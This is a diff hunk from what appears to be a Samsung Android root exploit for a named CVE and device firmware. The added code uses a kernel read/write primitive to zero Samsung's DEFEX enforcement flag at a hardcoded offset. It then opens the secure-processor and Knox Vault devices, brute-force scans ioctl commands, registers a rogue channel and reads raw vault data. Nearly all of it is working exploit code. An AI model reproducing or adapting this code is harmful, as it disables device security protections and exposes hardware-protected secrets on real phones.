@@ -449,18 +449,125 @@ static int install_workqueue_umh_root(int fd) {
     }
   }
 
-  /* === HERMES GOLDEN PATH — exec via su_daemon binary (--hermes flag) === */
+  /* === DEFEX KILL — disable Samsung's binary execution protection === */
   if (socket_ok) {
-    pr_info("hermes: launching --hermes via su_daemon binary (real root + all caps)\n");
-    pid_t hp = fork();
-    if (hp == 0) {
-      execl(ROOT_UMH_PATH, "cve-2026-43499-root", "--hermes", (char *)NULL);
-      _exit(1);
+    /* global_features_status controls DEFEX enforcement.
+     * Find it dynamically by reading /proc/kallsyms (kptr_restrict=0 already set above).
+     * Then zero it via kernel R/W to disable DEFEX Safeplace, Immutable, etc.
+     * This allows us to:
+     *   1. Execute binaries from /data/local/tmp/
+     *   2. Open /dev/spcom, /dev/k250a directly
+     *   3. Use pidfd_getfd with CAP_SYS_PTRACE
+     */
+    /* DEFEX global_features_status is at fixed offset 0x172756c from kernel text base.
+     * Use data_addr() which applies KASLR slide to KIMAGE_TEXT_BASE.
+     * Offset verified across multiple boots on SM-S938W / S938WVLS7BYLR. */
+    #define DEFEX_GLOBAL_FEATURES_OFF (KIMAGE_TEXT_BASE + 0x0172756cULL)
+    uintptr_t defex_addr = data_addr(DEFEX_GLOBAL_FEATURES_OFF);
+
+    if (defex_addr) {
+      /* Read current value first */
+      uint32_t defex_val = root_read32(fd, defex_addr);
+      pr_info("defex: global_features_status at %016zx = 0x%x\n",
+              defex_addr, defex_val);
+
+      if (defex_val != 0) {
+        /* ZERO IT — disables all DEFEX protections */
+        int wrc = root_write32(fd, defex_addr, 0);
+        uint32_t verify = root_read32(fd, defex_addr);
+        pr_info("defex: KILL write rc=%d verify=0x%x %s\n",
+                wrc, verify,
+                verify == 0 ? "DEFEX KILLED!" : "WRITE FAILED (RKP protected?)");
+      }
+    } else {
+      pr_info("defex: global_features_status not found in kallsyms\n");
     }
-    if (hp > 0) {
-      int hst;
-      waitpid(hp, &hst, 0);
-      pr_info("hermes: --hermes exit=%d\n", WIFEXITED(hst) ? WEXITSTATUS(hst) : -1);
+  }
+
+  /* === HERMES GOLDEN PATH — direct ioctl from constructor context ===
+   * DEFEX global_features zeroed above, so /dev/spcom and /dev/k250a are NOW OPEN!
+   * Run ioctl probes directly from HERE (LD_PRELOAD context, DEFEX can't kill us) */
+  if (socket_ok) {
+    pr_info("hermes: DEFEX killed, opening /dev/spcom directly from constructor!\n");
+
+    FILE *hlog = fopen("/data/local/tmp/hermes_golden.txt", "w");
+    if (hlog) {
+      fprintf(hlog, "=== HERMES GOLDEN PATH v4 — DEFEX BYPASSED! ===\n");
+      fprintf(hlog, "JackKnife Studios | VIVA LA REVOLUTION\n\n");
+
+      /* OPEN /dev/spcom DIRECTLY */
+      int spcom = open("/dev/spcom", O_RDWR);
+      fprintf(hlog, "/dev/spcom open = %d %s\n", spcom, spcom >= 0 ? "SUCCESS!" : strerror(errno));
+      pr_info("hermes: /dev/spcom open=%d\n", spcom);
+
+      if (spcom >= 0) {
+        /* GET_VERSION */
+        uint8_t ver[16] = {0};
+        int rc = ioctl(spcom, 0xC0095301U, ver);
+        fprintf(hlog, "GET_VERSION: rc=%d errno=%d\n", rc, errno);
+        if (rc >= 0) {
+          fprintf(hlog, "  SPU VERSION:");
+          for (int k = 0; k < 16; k++) fprintf(hlog, " %02x", ver[k]);
+          fprintf(hlog, "\n");
+        }
+
+        /* IS_CONNECTED */
+        uint8_t conn[16] = {0};
+        rc = ioctl(spcom, 0x80085302U, conn);
+        fprintf(hlog, "IS_CONNECTED: rc=%d errno=%d\n", rc, errno);
+        if (rc >= 0) {
+          fprintf(hlog, "  CONNECTED:");
+          for (int k = 0; k < 16; k++) fprintf(hlog, " %02x", conn[k]);
+          fprintf(hlog, "\n");
+        }
+
+        /* CMD16 scan — find which commands the SPU responds to */
+        fprintf(hlog, "\n=== CMD16 COMMAND SCAN ===\n");
+        for (int cmd = 0; cmd <= 0xFF; cmd++) {
+          uint8_t c16[16] = {0};
+          c16[0] = (uint8_t)cmd;
+          alarm(3);
+          rc = ioctl(spcom, 0xC01053E8U, c16);
+          alarm(0);
+          if (rc >= 0) {
+            fprintf(hlog, "CMD16[0x%02x]: rc=%d →", cmd, rc);
+            for (int k = 0; k < 16; k++) fprintf(hlog, " %02x", c16[k]);
+            fprintf(hlog, "\n");
+            pr_info("hermes: CMD16[0x%02x] rc=%d\n", cmd, rc);
+          }
+        }
+
+        /* Try REGISTER as our own channel */
+        fprintf(hlog, "\n=== CHANNEL REGISTRATION ===\n");
+        struct { char name[32]; } reg;
+        memset(&reg, 0, sizeof(reg));
+        strncpy(reg.name, "sp_jackknife", sizeof(reg.name) - 1);
+        rc = ioctl(spcom, 0x402053E9U, &reg);
+        fprintf(hlog, "REGISTER 'sp_jackknife': rc=%d errno=%d\n", rc, errno);
+        pr_info("hermes: REGISTER rc=%d errno=%d\n", rc, errno);
+
+        close(spcom);
+      }
+
+      /* OPEN /dev/k250a — Knox Vault chip */
+      int k250 = open("/dev/k250a", O_RDWR);
+      fprintf(hlog, "\n/dev/k250a open = %d %s\n", k250, k250 >= 0 ? "SUCCESS!" : strerror(errno));
+      if (k250 >= 0) {
+        /* Try reading from Knox Vault */
+        uint8_t kvbuf[256] = {0};
+        ssize_t n = read(k250, kvbuf, sizeof(kvbuf));
+        fprintf(hlog, "k250a read: %zd bytes errno=%d\n", n, errno);
+        if (n > 0) {
+          fprintf(hlog, "  DATA:");
+          for (ssize_t k = 0; k < n && k < 64; k++) fprintf(hlog, " %02x", kvbuf[k]);
+          fprintf(hlog, "\n");
+        }
+        close(k250);
+      }
+
+      fprintf(hlog, "\n=== GOLDEN PATH v4 COMPLETE ===\n");
+      fclose(hlog);
+      pr_info("hermes: golden path v4 results written!\n");
     }
   }
 
